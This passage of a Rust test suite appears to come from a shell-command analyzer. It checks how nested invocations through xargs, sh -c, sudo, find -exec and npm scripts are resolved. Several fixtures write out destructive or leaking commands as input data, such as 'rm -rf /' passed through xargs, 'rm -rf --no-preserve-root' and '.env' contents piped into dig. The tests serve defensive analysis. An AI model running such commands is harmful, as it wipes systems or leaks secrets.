    fn resolve_invocation_pass_expands_function_defined_earlier_in_same_request() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            "deploy() { bash ./scripts/build.sh; }\ndeploy",
        );

        assert!(
            ctx.execution_unit_resolve_records()
                .iter()
                .any(|record| { record.source_node_id.0 == "derived-function:sess-1:2:0:0" })
        );

        let derived_record = ctx
            .execution_unit_resolve_records()
            .iter()
            .find(|record| record.source_node_id.0 == "derived-function:sess-1:2:0:0")
            .expect("expected same-request function expansion");

        match &derived_record.result {
            ResolveInvocationArtifactResult::Resolved(resolved) => {
                assert_eq!(resolved.normalized_command_name, "bash");
                assert_eq!(resolved.bound.form_id.as_str(), "script_file");
            }
            other => panic!("expected same-request function expansion, got {other:?}"),
        }
    }

    #[test]
    fn resolve_invocation_pass_honors_unset_function_before_call() {
        let mut summary = SessionSummary::new();
        summary.upsert_function_binding(SessionFunctionBinding::new(
            "deploy",
            "bash ./scripts/build.sh;",
            CommandSequenceNo::new(1),
        ));

        let ctx = run_pass(&summary, ShellKind::Bash, "unset -f deploy; deploy");

        let deploy_record = ctx
            .execution_unit_resolve_records()
            .iter()
            .find(|record| {
                matches!(
                    &record.result,
                    ResolveInvocationArtifactResult::NoProfile {
                        normalized_command_name,
                        ..
                    } if normalized_command_name == "deploy"
                )
            })
            .expect("expected deploy no-profile record");

        match &deploy_record.result {
            ResolveInvocationArtifactResult::NoProfile {
                normalized_command_name,
                ..
            } => assert_eq!(normalized_command_name, "deploy"),
            other => {
                panic!("expected unset function call to fall back to no-profile, got {other:?}")
            }
        }
        assert!(
            !ctx.execution_unit_resolve_records()
                .iter()
                .any(|record| { record.source_node_id.0 == "derived-function:sess-1:2:1:0" })
        );
    }

    #[test]
    fn resolve_invocation_pass_preserves_no_profile_result() {
        let summary = SessionSummary::new();
        let ctx = run_pass(&summary, ShellKind::Bash, "unknown-tool --help");

        match &top_level_record(&ctx, 0).result {
            ResolveInvocationArtifactResult::NoProfile {
                normalized_command_name,
                ..
            } => {
                assert_eq!(normalized_command_name, "unknown-tool");
            }
            other => panic!("expected no-profile resolve result, got {other:?}"),
        }
    }

    #[test]
    fn resolve_invocation_pass_resolves_dispatch_derived_command_from_yaml_profile() {
        let summary = SessionSummary::new();
        let ctx = run_pass_with_registry(
            &summary,
            ShellKind::Bash,
            r#"sudo sh -c 'echo ok'"#,
            built_in_registry(),
        );

        let top_level = ctx
            .execution_unit_resolve_records()
            .iter()
            .find(|record| {
                record.origin_kind == caushell_runner::ExecutionUnitOriginKind::TopLevel
                    && record.source_node_id.0 == "command:sess-1:2:0"
            })
            .expect("expected top-level resolve record");

        match &top_level.result {
            ResolveInvocationArtifactResult::Resolved(resolved) => {
                assert_eq!(resolved.normalized_command_name, "sudo");
                assert_eq!(resolved.bound.form_id.as_str(), "wrapped_command");
                assert_eq!(
                    first_argument_text(&resolved.bound, "wrapped_command"),
                    "sh"
                );
            }
            other => panic!("expected resolved sudo invocation, got {other:?}"),
        }

        let derived_record = ctx
            .execution_unit_resolve_records()
            .iter()
            .find(|record| record.source_node_id.0 == "derived-dispatch:sess-1:2:0:0")
            .expect("expected dispatch-derived resolve record");
        assert_eq!(
            derived_record.source_node_id.0,
            "derived-dispatch:sess-1:2:0:0"
        );
        assert_eq!(derived_record.command_ref.command_index, 0);

        match &derived_record.result {
            ResolveInvocationArtifactResult::Resolved(resolved) => {
                assert_eq!(resolved.normalized_command_name, "sh");
                assert_eq!(resolved.bound.form_id.as_str(), "command_string");
                assert_eq!(first_argument_text(&resolved.bound, "payload"), "echo ok");
            }
            other => panic!("expected resolved derived sh invocation, got {other:?}"),
        }

        assert!(ctx.pending_mutations().iter().any(|mutation| matches!(
            mutation,
            PendingMutation::AddDerivedInvocation {
                node_id,
                origin,
                derived_command_index,
                raw_text,
                command_name,
                depth,
                ..
            } if node_id.0 == "derived-dispatch:sess-1:2:0:0"
                && *origin == DerivedInvocationOrigin::Dispatch {
                    source_command_index: 0,
                    dispatch_index: 0,
                    command_slot: "wrapped_command".to_string(),
                }
                && *derived_command_index == 0
                && raw_text == "sh -c echo ok"
                && command_name.as_deref() == Some("sh")
                && *depth == 1
        )));
    }

    #[test]
    fn resolve_invocation_pass_extracts_npm_config_defined_task_body_from_package_json() {
        let summary = SessionSummary::new();
        let request = sample_request(
            ShellKind::Bash,
            r#"printf '%s' '{"scripts":{"build":"bash ./scripts/build.sh"}}' >package.json; npm run build"#,
        );
        let config_path = format!("{}/package.json", request.shell_state_before.cwd());

        let ctx = run_pass_with_request(&summary, request, built_in_registry());

        match &top_level_record(&ctx, 1).result {
            ResolveInvocationArtifactResult::Resolved(resolved) => {
                assert_eq!(resolved.normalized_command_name, "npm");
                assert_eq!(resolved.bound.form_id.as_str(), "run_script");
                assert_eq!(first_argument_text(&resolved.bound, "script_name"), "build");
            }
            other => panic!("expected resolved npm invocation, got {other:?}"),
        }

        assert_eq!(ctx.nested_payload_records().len(), 1);
        let record = &ctx.nested_payload_records()[0];
        assert_eq!(
            record.parent_ref,
            NestedPayloadParentRef::RootCommand { command_index: 1 }
        );
        assert_eq!(record.root_command_index, 1);
        assert_eq!(record.depth, 1);
        assert_eq!(
            record.candidate.candidate.origin,
            caushell_profile::RecursivePayloadOrigin::ConfigDefinedTask {
                config_path: config_path.clone(),
                task_name: "build".to_string(),
            }
        );
        assert_eq!(
            record.candidate.candidate.input,
            caushell_profile::RecursivePayloadInput::LiteralText {
                text: "bash ./scripts/build.sh".to_string(),
            }
        );

        match &record.resolution {
            NestedPayloadResolution::Parsed { shell_kind, parsed } => {
                assert_eq!(*shell_kind, ShellKind::Sh);
                assert_eq!(parsed.commands.len(), 1);
                assert_eq!(parsed.commands[0].command_name.as_deref(), Some("bash"));
            }
            other => panic!("expected parsed config-defined-task body, got {other:?}"),
        }

        let derived_record = ctx
            .execution_unit_resolve_records()
            .iter()
            .find(|record| record.source_node_id.0 == "derived:sess-1:2:0:0")
            .expect("expected config-defined-task derived resolve record");

        match &derived_record.result {
            ResolveInvocationArtifactResult::Resolved(resolved) => {
                assert_eq!(resolved.normalized_command_name, "bash");
                assert_eq!(resolved.bound.form_id.as_str(), "script_file");
                assert_eq!(
                    first_argument_text(&resolved.bound, "script_path"),
                    "./scripts/build.sh"
                );
            }
            other => panic!("expected resolved derived task command, got {other:?}"),
        }

        match &ctx.evidence[0].kind {
            EvidenceKind::NestedPayloadParsed(parsed) => {
                assert_eq!(
                    parsed.context.origin,
                    NestedPayloadOriginEvidence::ConfigDefinedTask {
                        config_path,
                        task_name: "build".to_string(),
                    }
                );
                assert_eq!(
                    parsed.context.input,
                    caushell_types::NestedPayloadInputEvidence::LiteralText {
                        text: "bash ./scripts/build.sh".to_string(),
                    }
                );
                assert_eq!(parsed.parsed_command_count, 1);
            }
            other => panic!("expected config-defined-task nested evidence, got {other:?}"),
        }
    }

    #[test]
    fn resolve_invocation_pass_records_truncated_nested_payload_when_depth_budget_is_reached() {
        let summary = SessionSummary::new();
        let policy = PolicyConfig {
            semantic_expansion: caushell_types::SemanticExpansionPolicy {
                max_nested_parse_depth: 1,
            },
            ..PolicyConfig::default()
        };
        let ctx = run_pass_with_policy(
            &summary,
            ShellKind::Bash,
            r#"bash -c 'sh -c "echo ok"'"#,
            policy,
        );

        assert_eq!(ctx.nested_payload_records().len(), 2);

        let parsed = ctx
            .nested_payload_records()
            .iter()
            .find(|record| record.depth == 1)
            .expect("expected parsed depth-1 record");
        let truncated = ctx
            .nested_payload_records()
            .iter()
            .find(|record| record.depth == 2)
            .expect("expected truncated depth-2 record");

        assert_eq!(
            parsed.parent_ref,
            NestedPayloadParentRef::RootCommand { command_index: 0 }
        );
        assert_eq!(
            truncated.parent_ref,
            NestedPayloadParentRef::DerivedInvocation {
                node_id: caushell_graph::NodeId::new("expanded-shell-payload:command:sess-1:2:0:0"),
            }
        );
        assert!(
            ctx.execution_unit_resolve_records()
                .iter()
                .any(|unit| truncated.parent_ref
                    == NestedPayloadParentRef::DerivedInvocation {
                        node_id: unit.source_node_id.clone()
                    })
        );
        assert_eq!(truncated.root_command_index, 0);

        match &truncated.resolution {
            NestedPayloadResolution::TruncatedByDepthBudget {
                max_depth,
                next_candidate_count,
            } => {
                assert_eq!(*max_depth, 1);
                assert_eq!(*next_candidate_count, 1);
            }
            other => panic!("expected truncated resolution, got {other:?}"),
        }

        let parsed_evidence = ctx
            .evidence
            .iter()
            .find(|evidence| matches!(evidence.kind, EvidenceKind::NestedPayloadParsed(_)))
            .expect("expected parsed nested payload evidence");
        let truncated_evidence = ctx
            .evidence
            .iter()
            .find(|evidence| matches!(evidence.kind, EvidenceKind::NestedPayloadTruncated(_)))
            .expect("expected truncated nested payload evidence");

        assert_eq!(parsed_evidence.rule_id, RuleId::NestedPayloadExpansion);
        assert_eq!(truncated_evidence.rule_id, RuleId::NestedPayloadExpansion);
    }

    #[test]
    fn resolve_invocation_pass_projects_parsed_nested_payload_into_evidence() {
        let summary = SessionSummary::new();
        let ctx = run_pass(&summary, ShellKind::Bash, r#"bash -c 'echo ok'"#);

        assert_eq!(ctx.evidence.len(), 1);

        match &ctx.evidence[0].kind {
            EvidenceKind::NestedPayloadParsed(parsed) => {
                assert_eq!(ctx.evidence[0].rule_id, RuleId::NestedPayloadExpansion);
                assert_eq!(
                    parsed.context.parent_ref,
                    NestedPayloadParentEvidence::RootCommand { command_index: 0 }
                );
                assert_eq!(
                    parsed.context.origin,
                    NestedPayloadOriginEvidence::Parameter {
                        slot_name: "payload".to_string(),
                    }
                );
                assert_eq!(parsed.context.depth, 1);
                assert_eq!(parsed.shell_kind, ShellKind::Bash);
                assert_eq!(parsed.parsed_command_count, 1);
            }
            other => panic!("expected parsed nested payload evidence, got {other:?}"),
        }
    }

    #[test]
    fn resolve_invocation_pass_projects_unresolved_nested_payload_into_evidence() {
        let summary = SessionSummary::new();
        let ctx = run_pass(&summary, ShellKind::Bash, r#"bash -c "$USER_CMD""#);

        assert_eq!(ctx.nested_payload_records().len(), 1);
        assert_eq!(ctx.evidence.len(), 1);

        match &ctx.evidence[0].kind {
            EvidenceKind::NestedPayloadUnresolved(unresolved) => {
                assert_eq!(ctx.evidence[0].rule_id, RuleId::NestedPayloadExpansion);
                assert_eq!(
                    unresolved.context.parent_ref,
                    NestedPayloadParentEvidence::RootCommand { command_index: 0 }
                );
                assert_eq!(
                    unresolved.reason,
                    NestedPayloadUnresolvedReasonEvidence::MissingBinding {
                        variable_name: "USER_CMD".to_string(),
                    }
                );
            }
            other => panic!("expected unresolved nested payload evidence, got {other:?}"),
        }
    }

    #[test]
    fn resolve_invocation_pass_rewrites_quoted_python_heredoc_to_literal_nested_payload() {
        let summary = SessionSummary::new();
        let ctx = run_pass(&summary, ShellKind::Bash, "python <<'PY'\nprint(1)\nPY");

        assert_eq!(ctx.nested_payload_records().len(), 1);

        let record = &ctx.nested_payload_records()[0];
        assert_eq!(
            record.candidate.candidate.input,
            caushell_profile::RecursivePayloadInput::LiteralText {
                text: "print(1)\n".to_string(),
            }
        );

        assert!(!ctx.evidence.iter().any(|e| matches!(
            &e.kind,
            EvidenceKind::PythonPayload(_)
                | EvidenceKind::PythonStdoutField(_)
                | EvidenceKind::PythonStartup(_)
        )));
        let evidence = ctx
            .evidence
            .iter()
            .find(|e| matches!(e.kind, EvidenceKind::NestedPayloadUnresolved(_)))
            .expect("unresolved payload evidence");
        match &evidence.kind {
            EvidenceKind::NestedPayloadUnresolved(unresolved) => {
                assert_eq!(
                    unresolved.unresolved_execution_payload_subtype,
                    Some(caushell_types::UnresolvedExecutionPayloadSubtype::OpaqueNonShell)
                );
                assert_eq!(
                    unresolved.reason,
                    NestedPayloadUnresolvedReasonEvidence::UnsupportedLanguage
                );
            }
            other => panic!("expected unresolved nested payload evidence, got {other:?}"),
        }
    }

    #[test]
    fn resolve_invocation_pass_projects_nested_payload_from_dispatch_derived_child() {
        let summary = SessionSummary::new();
        let ctx = run_pass_with_registry(
            &summary,
            ShellKind::Bash,
            r#"sudo --user=root sh -c 'echo ok'"#,
            built_in_registry(),
        );

        assert_eq!(ctx.nested_payload_records().len(), 1);

        let record = &ctx.nested_payload_records()[0];
        assert_eq!(
            record.parent_ref,
            NestedPayloadParentRef::DerivedInvocation {
                node_id: caushell_graph::NodeId::new("derived-dispatch:sess-1:2:0:0"),
            }
        );
        assert_eq!(record.root_command_index, 0);
        assert_eq!(record.depth, 1);

        match &ctx.evidence[0].kind {
            EvidenceKind::NestedPayloadParsed(parsed) => {
                assert_eq!(
                    parsed.context.parent_ref,
                    NestedPayloadParentEvidence::DerivedInvocation {
                        node_id: "derived-dispatch:sess-1:2:0:0".to_string(),
                    }
                );
                assert_eq!(parsed.parsed_command_count, 1);
            }
            other => panic!("expected parsed nested payload evidence, got {other:?}"),
        }

        assert!(ctx.pending_mutations().iter().any(|mutation| matches!(
            mutation,
            PendingMutation::AddNestedPayload {
                node_id,
                relation_from_command,
                relation_from_parent,
                parent_node_id,
                ..
            } if node_id.0 == "nested:sess-1:2:0"
                && relation_from_command.is_none()
                && *relation_from_parent == Some(caushell_graph::EdgeKind::ExpandsTo)
                && *parent_node_id
                    == Some(caushell_graph::NodeId::new("derived-dispatch:sess-1:2:0:0"))
        )));
    }

    #[test]
    fn resolve_invocation_pass_expands_process_substitution_into_unified_records() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"printf 'echo ok' | xargs bash -c "cat <(printf 'echo nested')""#,
        );

        let procsub = ctx
            .execution_unit_resolve_records()
            .iter()
            .find(|record| {
                record.origin_kind
                    == caushell_runner::ExecutionUnitOriginKind::ProcessSubstitutionBody
                    && record.rendered_command_text == "printf 'echo nested'"
            })
            .expect("expected process substitution body child");

        assert_eq!(procsub.root_command_index, 1);
        assert_eq!(procsub.depth, 3);
    }

    #[test]
    fn resolve_invocation_pass_does_not_expand_unbound_shell_command_string_payload() {
        let summary = SessionSummary::new();
        let ctx = run_pass(&summary, ShellKind::Bash, "bash -c -s");

        match &top_level_record(&ctx, 0).result {
            ResolveInvocationArtifactResult::Resolved(resolved) => {
                assert_eq!(resolved.bound.form_id.as_str(), "command_string");
                assert!(resolved.bound.effects.is_empty());
                assert!(!resolved.bound.residuals.is_empty());
            }
            other => panic!("expected resolved invocation result, got {other:?}"),
        }

        assert!(
            ctx.execution_unit_resolve_records()
                .iter()
                .all(|record| record.origin_kind
                    != caushell_runner::ExecutionUnitOriginKind::ShellCommandStringPayload)
        );
        assert!(ctx.pending_mutations().iter().all(|mutation| {
            !matches!(
                mutation,
                PendingMutation::AddDerivedInvocation {
                    origin: DerivedInvocationOrigin::ShellCommandStringPayload { .. },
                    ..
                }
            )
        }));
    }

    #[test]
    fn incomplete_xargs_input_does_not_prove_a_shell_positional_argument() {
        let summary = SessionSummary::new();
        let graph = graph_with_known_payload_file(
            "/tmp/project/payload.txt",
            "printf 'safe\\n' > payload.txt",
            CommandSequenceNo::new(1),
        );
        for files in ["missing.txt payload.txt", "payload.txt missing.txt"] {
            let ctx = run_pass_with_session(
                graph.clone(),
                &summary,
                ShellKind::Bash,
                &format!("cat {files} | xargs sh -c 'rm \"$1\"' _"),
            );
            assert!(ctx.execution_unit_resolve_records().iter().any(|record| {
                record.origin_kind == caushell_runner::ExecutionUnitOriginKind::ShellCommandStringPayload
                    && matches!(&record.result, ResolveInvocationArtifactResult::Resolved(resolved)
                        if resolved.normalized_command_name.as_str() == "rm"
                            && resolved.bound.bound_parameters.iter().flat_map(|parameter| &parameter.values)
                                .any(|value| matches!(value, BoundValue::ImplicitInput { source: caushell_profile::ImplicitInputSource::StdinData, domain: Some(caushell_types::RuntimeArgumentDomain::Unbounded), .. })))
            }), "partial input must not prove $1: {files}");
        }
    }

    #[test]
    fn resolve_invocation_pass_records_static_xargs_shell_child_in_unified_records() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"printf '/\n' | xargs bash -lc 'rm -rf "$0"'"#,
        );

        let xargs_child = ctx
            .execution_unit_resolve_records()
            .iter()
            .find(|record| {
                record.origin_kind == caushell_runner::ExecutionUnitOriginKind::StaticXargs
                    && execution_record_matches_fixture(record, "bash '-lc' 'rm -rf \"$0\"' '/'")
            })
            .expect("expected static xargs child");

        assert_eq!(xargs_child.root_command_index, 1);

        assert!(ctx.execution_unit_resolve_records().iter().any(|record| {
            record.origin_kind
                == caushell_runner::ExecutionUnitOriginKind::ShellCommandStringPayload
                && execution_record_matches_fixture(record, "rm -rf \"/\"")
                && record.parent_execution_node_id == xargs_child.source_node_id
        }));
    }

    #[test]
    fn resolve_invocation_pass_records_static_xargs_null_delimited_child() {
        let summary = SessionSummary::new();
        let ctx = run_pass(&summary, ShellKind::Bash, "printf '/\\0' | xargs -0 rm -rf");

        assert!(ctx.execution_unit_resolve_records().iter().any(|record| {
            record.origin_kind == caushell_runner::ExecutionUnitOriginKind::StaticXargs
                && execution_record_matches_fixture(record, "rm '-rf' '/'")
        }));
    }

    #[test]
    fn native_input_fragments_join_without_invented_separators_and_keep_empty_fields() {
        use super::{XargsItemMode, parse_xargs_default_items, xargs_items_from_payloads};
        let parts = vec!["--check".into(), "point=1\0\0input\0".into()];
        assert_eq!(
            xargs_items_from_payloads(&parts, &XargsItemMode::NullSeparated, None),
            Some(vec!["--checkpoint=1".into(), "".into(), "input".into()])
        );
        let parts = vec!["--check".into(), "point=1||input|".into()];
        assert_eq!(
            xargs_items_from_payloads(
                &parts,
                &XargsItemMode::Delimited {
                    delimiter: "|".into()
                },
                None
            ),
            Some(vec!["--checkpoint=1".into(), "".into(), "input".into()])
        );
        let parts = vec!["--check".into(), "point=1 input".into()];
        assert_eq!(
            parse_xargs_default_items(&parts),
            Some(vec!["--checkpoint=1".into(), "input".into()])
        );
        assert_eq!(
            xargs_items_from_payloads(&["".into()], &XargsItemMode::NullSeparated, None),
            Some(vec![])
        );
        assert_eq!(
            xargs_items_from_payloads(&["\0".into()], &XargsItemMode::NullSeparated, None),
            Some(vec!["".into()])
        );
    }

    #[test]
    fn native_replacement_quotes_and_backslashes_match_print_only_oracle() {
        use super::{XargsItemMode, parse_xargs_default_items, xargs_items_from_payloads};
        for (payload, expected) in [
            ("'--flag=one two'\n", vec!["--flag=one two"]),
            ("  one two\nnext\n", vec!["one two", "next"]),
            ("\"one\\two\"\n", vec!["one\\two"]),
            ("one\\\ntwo\n", vec!["one\ntwo"]),
            ("\n\n", vec![]),
        ] {
            let expected = Some(expected.into_iter().map(str::to_owned).collect::<Vec<_>>());
            assert_eq!(
                xargs_items_from_payloads(
                    &[payload.into()],
                    &XargsItemMode::NewlineSeparated,
                    None
                ),
                expected,
                "{payload:?}"
            );
        }
        assert_eq!(
            parse_xargs_default_items(&["\"one\\two\"\n".into()]),
            Some(vec!["one\\two".into()])
        );
        assert!(
            xargs_items_from_payloads(
                &["'unterminated\n".into()],
                &XargsItemMode::NewlineSeparated,
                None
            )
            .is_none()
        );
        assert!(
            super::xargs_grouped_lines(
                &["one \nnext\n".into()],
                &XargsItemMode::WhitespaceSeparated,
                1,
                None
            )
            .is_none()
        );
    }

    #[test]
    fn xargs_replacement_dispatch_distinguishes_empty_input_from_one_empty_record() {
        let summary = SessionSummary::new();
        for (source, expected) in [
            (r#"printf '' | xargs -I @ printf '%s' @"#, 0),
            (r#"printf '' | xargs -i printf '%s' '{}'"#, 0),
            (r#"printf '' | xargs -I @ -n1 printf '%s' @"#, 0),
            (r#"printf '' | xargs -I @ -L2 printf '%s' @"#, 1),
            (r#"printf '\0' | xargs -0 -I @ printf '%s' @"#, 1),
            (r#"cat unknown.txt | xargs -I @ printf '%s' @"#, 1),
        ] {
            let ctx = run_pass(&summary, ShellKind::Bash, source);
            let children = ctx.execution_unit_resolve_records().iter()
                .filter(|r| r.origin_kind == caushell_runner::ExecutionUnitOriginKind::StaticXargs)
                .count();
            assert_eq!(children, expected, "{source}");
        }
    }

    #[test]
    fn native_scalar_numeric_forwarding_preserves_only_quoted_path_spelling_bounds() {
        let argv = caushell_parse::parse_command("worker placeholder", ShellKind::Bash).unwrap();
        let mut argument = caushell_profile::project_invocation(
            &argv.commands[0],
            caushell_profile::InvocationRuntimeContext::new(),
        )
        .args
        .remove(0);
        argument.text.clear();
        argument.implicit_input_source = Some(caushell_types::ImplicitInputSource::DispatchOutput);
        argument.runtime_argument_domain = Some(caushell_types::RuntimeArgumentDomain::PathSet {
            roots: vec!["./input".into()],
            may_escape: false,
            basename_suffix: None,
            no_adjacent_slashes: false,
            dot_relative_components: false,
            execdir_leaf: false,
        });
        argument.node_kind = "runtime_scalar".into();
        for (body, expected_fields, may_control) in [
            (
                "worker \"$0\"",
                caushell_profile::ArgumentFieldCount::ExactlyOne,
                false,
            ),
            (
                "worker $0",
                caushell_profile::ArgumentFieldCount::Unknown,
                true,
            ),
        ] {
            let mut parsed = caushell_parse::parse_command(body, ShellKind::Bash).unwrap();
            super::bind_shell_positional_arguments(&mut parsed, &[argument.clone()]);
            let projection = caushell_profile::project_invocation(
                &parsed.commands[0],
                caushell_profile::InvocationRuntimeContext::new(),
            );
            let shape = caushell_profile::argument_structure(&projection.args[0]);
            assert_eq!(shape.fields, expected_fields, "{body}");
            assert_eq!(shape.may_start_with("-"), may_control, "{body}");
        }
    }

    #[test]
    fn resolve_invocation_pass_records_static_xargs_default_quoted_child() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"printf "'/'\n" | xargs rm -rf"#,
        );

        assert!(ctx.execution_unit_resolve_records().iter().any(|record| {
            record.origin_kind == caushell_runner::ExecutionUnitOriginKind::StaticXargs
                && execution_record_matches_fixture(record, "rm '-rf' '/'")
        }));
    }

    #[test]
    fn native_argument_environment_gap_retains_dynamic_kind() {
        let ctx = run_pass(
            &SessionSummary::new(),
            ShellKind::Bash,
            "cat .env | xargs -I{} env QUERY={} sh -c 'dig -q \"$QUERY\"'",
        );
        let record = ctx.execution_unit_resolve_records().iter().find(|record| {
            !record.inherited_scope.native_argument_inputs.is_empty()
                && matches!(&record.result, ResolveInvocationArtifactResult::SelectionError { normalized_command_name, .. } if normalized_command_name == "env")
        }).unwrap();
        assert!(
            matches!(
                &record.result,
                ResolveInvocationArtifactResult::SelectionError {
                    gap_kind: caushell_types::ResolveGapKind::OpaqueInvocation,
                    error: caushell_profile::BindError::IndeterminateDispatch { .. },
                    ..
                }
            ),
            "{:?}",
            record.result
        );
        assert!(
            record
                .inherited_scope
                .native_argument_inputs
                .iter()
                .any(|input| input.consumer_node_id == record.source_node_id
                    && input.origin.producer_node_id == record.parent_execution_node_id
                    && !input.origin.data_ranges.is_empty())
        );
    }

    #[test]
    fn resolve_invocation_pass_records_static_xargs_default_backslash_child() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"printf '\\/\n' | xargs rm -rf"#,
        );

        assert!(ctx.execution_unit_resolve_records().iter().any(|record| {
            record.origin_kind == caushell_runner::ExecutionUnitOriginKind::StaticXargs
                && execution_record_matches_fixture(record, "rm '-rf' '/'")
        }));
    }

    #[test]
    fn resolve_invocation_pass_records_static_xargs_delimiter_child() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            "printf 'safe,/' | xargs -d , rm -rf",
        );

        assert!(ctx.execution_unit_resolve_records().iter().any(|record| {
            record.origin_kind == caushell_runner::ExecutionUnitOriginKind::StaticXargs
                && execution_record_matches_fixture(record, "rm '-rf' 'safe' '/'")
        }));
    }

    #[test]
    fn resolve_invocation_pass_records_static_xargs_attached_and_inline_option_children() {
        let summary = SessionSummary::new();
        for command in [
            "printf 'safe,/' | xargs -d, rm -rf",
            "printf 'safe,/' | xargs --delimiter=, rm -rf",
        ] {
            let ctx = run_pass(&summary, ShellKind::Bash, command);

            assert!(
                ctx.execution_unit_resolve_records().iter().any(|record| {
                    record.origin_kind == caushell_runner::ExecutionUnitOriginKind::StaticXargs
                        && execution_record_matches_fixture(record, "rm '-rf' 'safe' '/'")
                }),
                "expected static xargs child for {command}"
            );
        }
    }

    #[test]
    fn resolve_invocation_pass_records_static_xargs_child_from_attached_arg_file() {
        let summary = SessionSummary::new();
        let graph = graph_with_known_payload_file(
            "/tmp/project/payload.txt",
            "printf '/\\n' > payload.txt",
            CommandSequenceNo::new(1),
        );

        for command in [
            "xargs -apayload.txt rm -rf",
            "xargs --arg-file=payload.txt rm -rf",
        ] {
            let ctx = run_pass_with_session(graph.clone(), &summary, ShellKind::Bash, command);

            assert!(
                ctx.execution_unit_resolve_records().iter().any(|record| {
                    record.origin_kind == caushell_runner::ExecutionUnitOriginKind::StaticXargs
                        && execution_record_matches_fixture(record, "rm '-rf' '/'")
                }),
                "expected static xargs child for {command}"
            );
        }
    }

    #[test]
    fn resolve_invocation_pass_stops_static_xargs_items_at_eof_marker() {
        let summary = SessionSummary::new();
        for command in [
            r#"printf 'STOP\n/\n' | xargs -E STOP rm -rf"#,
            r#"printf 'STOP\n/\n' | xargs -ESTOP rm -rf"#,
            r#"printf 'STOP\n/\n' | xargs -eSTOP rm -rf"#,
            r#"printf 'STOP\n/\n' | xargs --eof=STOP rm -rf"#,
        ] {
            let ctx = run_pass(&summary, ShellKind::Bash, command);

            assert!(
                !ctx.execution_unit_resolve_records().iter().any(|record| {
                    record.origin_kind == caushell_runner::ExecutionUnitOriginKind::StaticXargs
                        && record.parsed_scope.commands[record.command_ref.command_index]
                            .tokens
                            .iter()
                            .any(|token| token.text == "/")
                }),
                "expected eof marker to stop xargs expansion before / for {command}"
            );
        }
    }

    #[test]
    fn resolve_invocation_pass_records_static_xargs_replace_token_child() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"printf '/\n' | xargs -I{} bash -lc 'rm -rf "$1"' _ {}"#,
        );

        let xargs_child = ctx
            .execution_unit_resolve_records()
            .iter()
            .find(|record| {
                record.origin_kind == caushell_runner::ExecutionUnitOriginKind::StaticXargs
                    && execution_record_matches_fixture(
                        record,
                        "bash '-lc' 'rm -rf \"$1\"' '_' '/'",
                    )
            })
            .expect("expected replace-token static xargs child");

        assert!(ctx.execution_unit_resolve_records().iter().any(|record| {
            record.origin_kind
                == caushell_runner::ExecutionUnitOriginKind::ShellCommandStringPayload
                && execution_record_matches_fixture(record, "rm -rf \"/\"")
                && record.parent_execution_node_id == xargs_child.source_node_id
        }));
    }

    #[test]
    fn resolve_invocation_pass_records_static_xargs_replace_token_sh_c_positional_child() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"printf '%s\n' / | xargs -I{} sh -c 'rm -rf --no-preserve-root "$1"' _ {}"#,
        );

        let xargs_child = ctx
            .execution_unit_resolve_records()
            .iter()
            .find(|record| {
                record.origin_kind == caushell_runner::ExecutionUnitOriginKind::StaticXargs
                    && execution_record_matches_fixture(
                        record,
                        "sh '-c' 'rm -rf --no-preserve-root \"$1\"' '_' '/'",
                    )
            })
            .expect("expected replace-token static xargs sh child");

        assert!(ctx.execution_unit_resolve_records().iter().any(|record| {
            record.origin_kind
                == caushell_runner::ExecutionUnitOriginKind::ShellCommandStringPayload
                && execution_record_matches_fixture(record, "rm -rf --no-preserve-root \"/\"")
                && record.parent_execution_node_id == xargs_child.source_node_id
        }));
    }

    #[test]
    fn resolve_invocation_pass_records_find_exec_shell_positional_placeholder_child() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"find victim -name important.txt -exec sh -c 'rm -f "$1"' sh {} \;"#,
        );

        let find_child = ctx
            .execution_unit_resolve_records()
            .iter()
            .find(|record| {
                record.origin_kind == caushell_runner::ExecutionUnitOriginKind::Dispatch
                    && execution_record_has_runtime_path(record, "sh", 3, &["victim"])
            })
            .unwrap_or_else(|| {
                panic!(
                    "find argv: {:#?}",
                    ctx.execution_unit_resolve_records()
                        .iter()
                        .map(|record| (
                            record.origin_kind,
                            &record.parsed_scope.commands[record.command_ref.command_index].tokens
                        ))
                        .collect::<Vec<_>>()
                )
            });

        let shell = &find_child.parsed_scope.commands[find_child.command_ref.command_index];
        assert_eq!(shell.tokens.len(), 4);
        assert_eq!(shell.tokens[1].text, "rm -f \"$1\"");

        assert!(ctx.execution_unit_resolve_records().iter().any(|record| {
            record.origin_kind
                == caushell_runner::ExecutionUnitOriginKind::ShellCommandStringPayload
                && execution_record_has_runtime_path(record, "rm", 1, &["victim"])
                && execution_record_binds_runtime_path(record, &["victim"])
                && record.parent_execution_node_id == find_child.source_node_id
        }));
    }

    #[test]
    fn resolve_invocation_pass_records_static_xargs_max_args_children() {
        let summary = SessionSummary::new();
        let ctx = run_pass(
            &summary,
            ShellKind::Bash,
            r#"printf 'safe\n/\n' | xargs -n 1 bash -lc 'rm -rf "$0"'"#,
        );

        let children: Vec<_> = ctx
            .execution_unit_resolve_records()
            .iter()
            .filter(|record| {
                record.origin_kind == caushell_runner::ExecutionUnitOriginKind::StaticXargs
            })
            .collect();

        assert_eq!(children.len(), 2);
        assert!(children.iter().any(|record| execution_record_has_argv(
            record,
            "bash",
            &["-lc", "rm -rf \"$0\"", "safe"]
        )));
        assert!(children.iter().any(|record| execution_record_has_argv(
            record,
            "bash",
            &["-lc", "rm -rf \"$0\"", "/"]
        )));
    }

    #[test]
    fn xargs_bounded_unknown_batches_preserve_scalar_roles_and_zero_input() {
        for (flag, expected) in [("-0", vec![0, 1, 2]), ("-r0", vec![1, 2])] {
            let command = format!("find . -print0 | xargs {flag} -n2 cp -n --");
            let ctx = run_pass(&SessionSummary::new(), ShellKind::Bash, &command);
            let mut counts = Vec::new();
            for record in ctx
